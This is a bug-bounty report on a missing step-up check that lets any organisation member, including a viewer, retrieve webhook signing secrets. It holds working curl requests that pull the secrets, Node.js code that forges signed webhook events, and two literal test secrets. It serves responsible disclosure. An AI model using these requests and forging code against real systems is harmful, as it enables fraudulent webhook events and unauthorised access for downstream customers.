# BUG-001 — Submission

## Title

Step-up authentication not enforced on webhook signing secret reveal (`includeSecret=true`) — any org role including read-only viewer can retrieve the plaintext HMAC signing key and forge validly-signed webhook events

## Summary

The public API specification (`https://app.dynamic.xyz/api-docs/public-api.yaml`, `#/components/parameters/includeSecret`) states that revealing a webhook's plaintext signing secret requires step-up authentication: *"a valid elevated access token with the `console:webhook_secret:reveal` scope, minted for the calling user, must be sent in the `x-dyn-elevated-access-token` header or the request is rejected with 403."*

In production this gate is not enforced at all. A regular 24-hour session JWT (`scope=user:basic`) alone returns the full plaintext secret with HTTP 200, and the `x-dyn-elevated-access-token` header is accepted completely unvalidated (any garbage string yields the same 200). The revealed value is confirmed to be the real webhook signing key: `HMAC-SHA256(secret, rawBody)` recomputed over a genuine captured delivery reproduces the `x-dynamic-signature-256` header exactly, so any holder of the secret can forge webhook events whose signatures are indistinguishable from genuine Dynamic webhooks.

The issue is aggravated by a broken-access-control dimension: a member downgraded to the **viewer** role (least-privileged role in the platform, `internalPermissions: []`) on an organization they do not own can retrieve the environment's signing secret with no re-authentication, while webhook write operations (POST/PUT/DELETE) are correctly blocked with 403 for the same session. Comparable secrets in the product are properly protected (captcha `secretKey` is write-only, `hasSecretKey: true`; the webhook list endpoint ignores `includeSecret`), confirming this endpoint's behavior is unintended.

## Steps to Reproduce

**Setup:** log into `app.dynamic.xyz` with any account that is a member of an organization (any role, including viewer). Copy the `Authorization: Bearer` JWT from any dashboard API call. A webhook must exist on the environment (create one pointing to your own receiver to capture a genuine delivery).

**Step 1 — Reveal the secret with the plain session JWT (no step-up):**

```bash
curl -s "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/721f79c5-572e-4d64-869d-680268d164b4?includeSecret=true" \
  -H "Authorization: Bearer <SESSION_JWT>" \
  -H "X-Request-Purpose: Research" \
  -H "X-Bugcrowd-Ninja: zeno0"
```

Observed (HTTP 200):

```json
{"url":"https://webhook.site/72e683f6-959e-4264-8aa8-82f389ed746d","secret":"dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9","version":"1.1.0","environmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","webhookId":"721f79c5-572e-4d64-869d-680268d164b4","events":["user.created"],"isEnabled":true}
```

**Step 2 — Prove the step-up header is unvalidated:**

```bash
curl -s "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/721f79c5-572e-4d64-869d-680268d164b4?includeSecret=true" \
  -H "Authorization: Bearer <SESSION_JWT>" \
  -H "x-dyn-elevated-access-token: garbage-invalid-token-xyz-123" \
  -H "X-Request-Purpose: Research" \
  -H "X-Bugcrowd-Ninja: zeno0"
```

Observed: identical HTTP 200 + plaintext secret. The header is not parsed or validated at all.

**Step 3 — Least-privilege confirmation (broken access control):** invite a second account to the organization, then downgrade it to `viewer` as the owner:

```bash
curl -s -X PUT "https://app.dynamicauth.com/api/v0/members/b84845be-6965-46ef-ae45-4f1a5e861c4b" \
  -H "Authorization: Bearer <OWNER_SESSION_JWT>" -H "Content-Type: application/json" \
  -d '{"role":"viewer"}'
```

Repeat Step 1 with the **viewer's** session JWT on the environment owned by the other account. Observed: HTTP 200 + plaintext secret. The same viewer session receives `403 {"error":"Unauthorized access"}` for POST/PUT/DELETE on webhooks — only the credential-reveal read bypasses the role model.

**Step 4 — Verify the secret is the real signing key (HMAC exact match):** trigger a genuine webhook delivery and capture the raw body and the `x-dynamic-signature-256` header. Then:

```javascript
const crypto = require('crypto');
const SECRET = 'dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9';
const rawBody = '<RAW_BODY_OF_GENUINE_DELIVERY>';        // unmodified bytes
const captured = '38260fc64e8a6ade544387e47d7b27946b1dff9545516e0effcae1eae60339b9';
const computed = crypto.createHmac('sha256', SECRET).update(rawBody, 'utf8').digest('hex');
console.log(computed === captured); // → true (EXACT MATCH)
```

**Step 5 — Forge a customer-trusted event:**

```javascript
const forged = JSON.stringify({
  messageId: crypto.randomUUID(), eventId: crypto.randomUUID(),
  eventName: 'user.created', timestamp: new Date().toISOString(),
  webhookId: '721f79c5-572e-4d64-869d-680268d164b4',
  userId: 'attacker-chosen-user-id',
  environmentId: '7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6', environmentName: 'sandbox',
  data: { id: 'attacker-chosen-user-id', email: 'attacker@evil.example', kycStatus: 'verified' },
});
const sig = crypto.createHmac('sha256', SECRET).update(forged, 'utf8').digest('hex');
// deliver with header: x-dynamic-signature-256: sha256=<sig>
```

The forged payload has byte-identical structure and signing scheme to genuine Dynamic deliveries (plain `HMAC-SHA256(secret, rawBody)`, hex-encoded, `sha256=`-prefixed — no timestamp mixing or canonicalization).

**Step 6 — Multi-integration harvest (extended impact):** webhooks are secret-per-receiver (two webhooks on one environment hold two distinct secrets), but the same viewer session harvests all of them. Create a second webhook on the environment, then as the **viewer**:

```bash
curl -s "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/2f87eb7c-58ed-4f59-9dc2-bc3cf49f757d?includeSecret=true" \
  -H "Authorization: Bearer <VIEWER_SESSION_JWT>" \
  -A "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0" \
  -H "X-Request-Purpose: Research" -H "X-Bugcrowd-Ninja: zeno0"
```

Observed: HTTP 200 + `dyn_[9fGd9CrAv6VDeKwott7hATen2[Wfeo:QTGWnsh9zOHJiSPuBZ1OkBqF` — a second, distinct signing key. HMAC verification of a genuine delivery from this second webhook against this second secret also matches exactly (`137a45b49add7909e671fd7bc1400e78cf02764996c8149b8cd8b53cd87ef0dc`), confirming every receiver's key is independently and fully exposed. Note the request used ONLY the `Authorization: Bearer` header — no cookies, a spoofed User-Agent, and a non-browser client — proving the API enforces no session binding (IP/UA/device), so a bare leaked JWT is sufficient.

## Impact

- **Any member of any customer organization, at any role — including read-only viewers such as auditors, contractors and support staff — can silently exfiltrate the webhook signing secret of every environment in the organization with a single GET.** No step-up, no OTP, no owner action, no elevated token, and no log anomaly beyond an ordinary 200 GET. Members downgraded to viewer instead of removed (common offboarding pattern) retain this capability.
- **Anyone holding any member's session token** (dashboard XSS, malicious browser extension, MITM proxy, leaked logs — the JWT is a replayable Bearer token valid for 24h) retrieves the secret with one replayed GET. This is precisely the threat that step-up authentication exists to mitigate, and the API's own specification promises a 403 here.
- **The stolen secret enables full webhook forgery:** arbitrary `user.created` / `wallet.linked` / `transaction.*` events signed with a valid HMAC that customer backends — which verify `x-dynamic-signature-256` as documented — accept as genuine. Concrete downstream abuse: auto-fulfillment and balance crediting without payment, forged KYC-approved statuses, unauthorized access provisioning, and silent persistence (forged events never traverse Dynamic's servers, leaving no audit trail).

- **Multi-integration blast radius:** secrets are per-webhook, and exposure scales linearly with a customer's integrations — every additional receiver (payments, KYC, CRM, analytics) adds one more signing key the viewer can read. In the demonstrated environment, a single viewer session harvested two distinct production-style signing keys in two GETs.
- **No self-service rotation:** the 525-operation public API contains no webhook secret rotation endpoint — a stolen key cannot be rotated by the customer via API, so the compromise persists until the customer manually rebuilds every integration receiver or engages support.
- **No session binding:** every request in this report was replayed with only the `Authorization` header (no cookies, spoofed User-Agent, non-browser client), so the 24h JWT alone — the exact artifact leaked by XSS, extensions, proxies or logs — is sufficient.
- **Scope note:** webhook creation on `live` environments is support-gated (`403 "Unauthorized: Live environment restricted"` even for owners), so the demonstration used a sandbox environment; the vulnerable code path (`getWebhook` with `includeSecret=true`) is environment-agnostic.

Suggested severity: **P2** — Broken Access Control (sensitive/privileged action available to least-privileged role) combined with missing step-up authentication on a credential reveal. All test identifiers and the signing secrets above belong to the researcher's own test environment (`zeno0@bugcrowdninja.com`); session JWTs are redacted and available to triage on request.
